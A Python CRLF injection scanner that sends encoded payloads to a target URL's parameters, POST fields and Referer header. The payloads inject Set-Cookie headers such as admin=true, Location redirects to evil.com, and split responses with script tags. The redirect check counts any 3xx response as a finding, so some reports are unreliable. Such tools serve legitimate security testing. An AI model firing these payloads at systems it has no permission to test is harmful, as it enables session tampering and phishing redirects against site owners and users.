#!/usr/bin/env python3
"""
CRLF Injection Analysis Module
Tests for CRLF (Carriage Return Line Feed) injection vulnerabilities
"""

import requests
import sys
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode
import re

class CRLFAnalyzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.vulnerabilities = []
        
    def generate_crlf_payloads(self):
        """Generate CRLF injection payloads"""
        base_payloads = [
            # Standard CRLF
            '%0d%0aSet-Cookie:crlf=injected',
            '%0D%0ASet-Cookie:crlf=injected',
            '\r\nSet-Cookie:crlf=injected',
            
            # Double encoding
            '%250d%250aSet-Cookie:crlf=injected',
            '%250D%250ASet-Cookie:crlf=injected',
            
            # Unicode encoding
            '%E5%98%8A%E5%98%8DSet-Cookie:crlf=injected',
            '%C4%8D%C4%8ASet-Cookie:crlf=injected',
            
            # URL encoding variations
            '%0aSet-Cookie:crlf=injected',
            '%0dSet-Cookie:crlf=injected',
            
            # Mixed encoding
            '%0d%0a%20Set-Cookie:crlf=injected',
            '%0d%0a%09Set-Cookie:crlf=injected',
            
            # Null byte
            '%00%0d%0aSet-Cookie:crlf=injected',
            
            # Line feed only
            '%0aSet-Cookie:crlf=injected',
            
            # Carriage return only
            '%0dSet-Cookie:crlf=injected',
            
            # Header injection
            '%0d%0aX-Injected-Header:crlf',
            '%0d%0aLocation:http://evil.com',
            
            # Response splitting
            '%0d%0a%0d%0a<script>alert("CRLF")</script>',
            '%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a',
            
            # With spaces
            '%20%0d%0aSet-Cookie:crlf=injected',
            '%0d%0a%20%20Set-Cookie:crlf=injected',
            
            # Alternative line breaks
            '%E5%98%8A%E5%98%8D',  # Unicode CRLF
            '%E2%80%A8',  # Line separator
            '%E2%80%A9',  # Paragraph separator
            
            # Bypass attempts
            '%5cr%5cnSet-Cookie:crlf=injected',
            '\\r\\nSet-Cookie:crlf=injected',
            '%u000d%u000aSet-Cookie:crlf=injected',
        ]
        
        return base_payloads
    
    def test_url_parameters(self):
        """Test URL parameters for CRLF injection"""
        print("[*] Testing URL parameters...")
        
        params = parse_qs(self.parsed_url.query)
        if not params:
            # Add test parameter if none exist
            params = {'redirect': ['test'], 'url': ['test'], 'next': ['test']}
        
        payloads = self.generate_crlf_payloads()
        
        for param_name in params.keys():
            for payload in payloads:
                try:
                    # Build test URL
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    query_string = urlencode(test_params, doseq=True)
                    test_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{self.parsed_url.path}?{query_string}"
                    
                    r = requests.get(test_url, timeout=5, allow_redirects=False)
                    
                    if self._check_crlf_injection(r, payload):
                        self.vulnerabilities.append({
                            'severity': self._get_severity(r),
                            'type': 'URL Parameter CRLF Injection',
                            'parameter': param_name,
                            'payload': payload,
                            'location': 'URL',
                            'method': 'GET',
                            'evidence': self._extract_evidence(r)
                        })
                except Exception as e:
                    pass
    
    def test_header_injection(self):
        """Test for header injection via various inputs"""
        print("[*] Testing header injection...")
        
        header_params = [
            'redirect', 'url', 'next', 'return', 'dest', 'destination',
            'redir', 'rurl', 'target', 'view', 'goto', 'link'
        ]
        
        payloads = [
            '%0d%0aX-Injected:true',
            '%0d%0aSet-Cookie:injected=true',
            '%0d%0aLocation:http://evil.com',
            '%0aX-Injected:true',
            '%0dX-Injected:true',
        ]
        
        for param in header_params:
            for payload in payloads:
                try:
                    test_url = f"{self.target_url}{'&' if '?' in self.target_url else '?'}{param}={payload}"
                    r = requests.get(test_url, timeout=5, allow_redirects=False)
                    
                    if self._check_header_injection(r):
                        self.vulnerabilities.append({
                            'severity': 'HIGH',
                            'type': 'HTTP Header Injection',
                            'parameter': param,
                            'payload': payload,
                            'injected_headers': self._get_injected_headers(r),
                            'method': 'GET'
                        })
                except Exception as e:
                    pass
    
    def test_redirect_injection(self):
        """Test for open redirect via CRLF"""
        print("[*] Testing redirect injection...")
        
        redirect_params = ['redirect', 'url', 'next', 'return', 'redir', 'goto']
        redirect_payloads = [
            '%0d%0aLocation:http://evil.com',
            '%0d%0aLocation:%20http://evil.com',
            '%0aLocation:http://evil.com',
            '%20%0d%0aLocation:http://evil.com',
        ]
        
        for param in redirect_params:
            for payload in redirect_payloads:
                try:
                    test_url = f"{self.target_url}{'&' if '?' in self.target_url else '?'}{param}={payload}"
                    r = requests.get(test_url, timeout=5, allow_redirects=False)
                    
                    location = r.headers.get('Location', '')
                    if 'evil.com' in location or r.status_code in [301, 302, 303, 307, 308]:
                        self.vulnerabilities.append({
                            'severity': 'HIGH',
                            'type': 'CRLF-based Open Redirect',
                            'parameter': param,
                            'payload': payload,
                            'redirect_location': location,
                            'status_code': r.status_code
                        })
                except Exception as e:
                    pass
    
    def test_cookie_injection(self):
        """Test for cookie injection via CRLF"""
        print("[*] Testing cookie injection...")
        
        cookie_payloads = [
            '%0d%0aSet-Cookie:injected=true',
            '%0d%0aSet-Cookie:admin=true',
            '%0aSet-Cookie:injected=true',
            '%0d%0a%20Set-Cookie:injected=true',
            '%250d%250aSet-Cookie:injected=true',
        ]
        
        test_params = ['redirect', 'url', 'next', 'page', 'file']
        
        for param in test_params:
            for payload in cookie_payloads:
                try:
                    test_url = f"{self.target_url}{'&' if '?' in self.target_url else '?'}{param}={payload}"
                    r = requests.get(test_url, timeout=5, allow_redirects=False)
                    
                    set_cookie = r.headers.get('Set-Cookie', '')
                    if 'injected' in set_cookie.lower() or self._check_crlf_injection(r, payload):
                        self.vulnerabilities.append({
                            'severity': 'CRITICAL',
                            'type': 'Cookie Injection via CRLF',
                            'parameter': param,
                            'payload': payload,
                            'injected_cookie': set_cookie,
                            'description': 'Attacker can inject arbitrary cookies'
                        })
                except Exception as e:
                    pass
    
    def test_response_splitting(self):
        """Test for HTTP response splitting"""
        print("[*] Testing response splitting...")
        
        splitting_payloads = [
            '%0d%0a%0d%0a<html><body>Injected</body></html>',
            '%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a',
            '%0d%0a%0d%0a<script>alert("XSS")</script>',
            '%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>Injected</html>',
        ]
        
        for payload in splitting_payloads:
            try:
                test_url = f"{self.target_url}{'&' if '?' in self.target_url else '?'}page={payload}"
                r = requests.get(test_url, timeout=5, allow_redirects=False)
                
                # Check if payload content appears in response
                if 'Injected' in r.text or 'HTTP/1.1' in r.text[:200]:
                    self.vulnerabilities.append({
                        'severity': 'CRITICAL',
                        'type': 'HTTP Response Splitting',
                        'payload': payload,
                        'description': 'Full HTTP response splitting detected',
                        'status_code': r.status_code
                    })
            except Exception as e:
                pass
    
    def test_post_body(self):
        """Test POST body for CRLF injection"""
        print("[*] Testing POST body...")
        
        payloads = self.generate_crlf_payloads()
        test_fields = ['redirect', 'url', 'next', 'comment', 'message']
        
        for field in test_fields:
            for payload in payloads:
                try:
                    data = {field: payload}
                    r = requests.post(self.target_url, data=data, timeout=5, allow_redirects=False)
                    
                    if self._check_crlf_injection(r, payload):
                        self.vulnerabilities.append({
                            'severity': self._get_severity(r),
                            'type': 'POST Body CRLF Injection',
                            'field': field,
                            'payload': payload,
                            'method': 'POST',
                            'evidence': self._extract_evidence(r)
                        })
                except Exception as e:
                    pass
    
    def test_referer_header(self):
        """Test Referer header for CRLF"""
        print("[*] Testing Referer header...")
        
        payloads = [
            'http://test.com%0d%0aX-Injected:true',
            'http://test.com%0aX-Injected:true',
        ]
        
        for payload in payloads:
            try:
                headers = {'Referer': payload}
                r = requests.get(self.target_url, headers=headers, timeout=5)
                
                if self._check_header_injection(r):
                    self.vulnerabilities.append({
                        'severity': 'MEDIUM',
                        'type': 'Referer Header CRLF',
                        'payload': payload,
                        'description': 'CRLF injection via Referer header'
                    })
            except Exception as e:
                pass
    
    def _check_crlf_injection(self, response, payload):
        """Check if CRLF injection was successful"""
        indicators = []
        
        # Check for injected headers
        suspicious_headers = ['X-Injected', 'Set-Cookie']
        for header in suspicious_headers:
            if header.lower() in [h.lower() for h in response.headers.keys()]:
                if 'injected' in response.headers.get(header, '').lower() or \
                   'crlf' in response.headers.get(header, '').lower():
                    indicators.append('injected_header')
        
        # Check Set-Cookie header
        set_cookie = response.headers.get('Set-Cookie', '')
        if 'injected' in set_cookie.lower() or 'crlf' in set_cookie.lower():
            indicators.append('injected_cookie')
        
        # Check for multiple Set-Cookie headers
        raw_headers = str(response.raw.headers) if hasattr(response, 'raw') else ''
        if raw_headers.lower().count('set-cookie') > 1:
            indicators.append('multiple_cookies')
        
        # Check response body for injected content
        if 'X-Injected' in response.text or 'HTTP/1.1' in response.text[:500]:
            indicators.append('body_injection')
        
        return len(indicators) > 0
    
    def _check_header_injection(self, response):
        """Check for header injection specifically"""
        injected_headers = ['X-Injected', 'X-Custom', 'X-CRLF']
        for header in injected_headers:
            if header in response.headers:
                return True
        return False
    
    def _get_injected_headers(self, response):
        """Get list of injected headers"""
        injected = []
        suspicious = ['X-Injected', 'X-Custom', 'X-CRLF']
        for header in suspicious:
            if header in response.headers:
                injected.append(f"{header}: {response.headers[header]}")
        return injected
    
    def _extract_evidence(self, response):
        """Extract evidence of CRLF injection"""
        evidence = []
        
        # Check headers
        for header, value in response.headers.items():
            if any(word in value.lower() for word in ['injected', 'crlf', 'evil']):
                evidence.append(f"Header: {header}: {value}")
        
        # Check for unusual status codes
        if response.status_code not in [200, 301, 302, 304, 404]:
            evidence.append(f"Status: {response.status_code}")
        
        return evidence[:3]  # Return top 3 pieces of evidence
    
    def _get_severity(self, response):
        """Determine severity based on impact"""
        set_cookie = response.headers.get('Set-Cookie', '')
        
        if 'injected' in set_cookie.lower():
            return 'CRITICAL'
        elif self._check_header_injection(response):
            return 'HIGH'
        elif response.status_code in [301, 302, 303, 307, 308]:
            return 'HIGH'
        else:
            return 'MEDIUM'
    
    def analyze_all(self):
        """Run all CRLF injection tests"""
        print(f"\n[*] Analyzing CRLF Injection for: {self.target_url}\n")
        
        self.test_url_parameters()
        self.test_header_injection()
        self.test_redirect_injection()
        self.test_cookie_injection()
        self.test_response_splitting()
        self.test_post_body()
        self.test_referer_header()
        
        return self.vulnerabilities
    
    def print_report(self):
        """Print formatted vulnerability report"""
        if not self.vulnerabilities:
            print("\n[+] No CRLF injection vulnerabilities detected!")
            return
        
        print(f"\n[!] Found {len(self.vulnerabilities)} CRLF injection vulnerability(ies):\n")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"[{i}] {vuln['type']} [{vuln['severity']}]")
            for key, value in vuln.items():
                if key not in ['type', 'severity']:
                    if isinstance(value, list):
                        print(f"    {key}:")
                        for item in value:
                            print(f"        - {item}")
                    else:
                        print(f"    {key}: {value}")
            print()

def main():
    if len(sys.argv) < 2:
        print("Usage: python crlf_analyzer.py <target_url>")
        print("Example: python crlf_analyzer.py https://example.com/redirect?url=test")
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Validate URL format
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    analyzer = CRLFAnalyzer(target)
    analyzer.analyze_all()
    analyzer.print_report()

if __name__ == "__main__":
    main()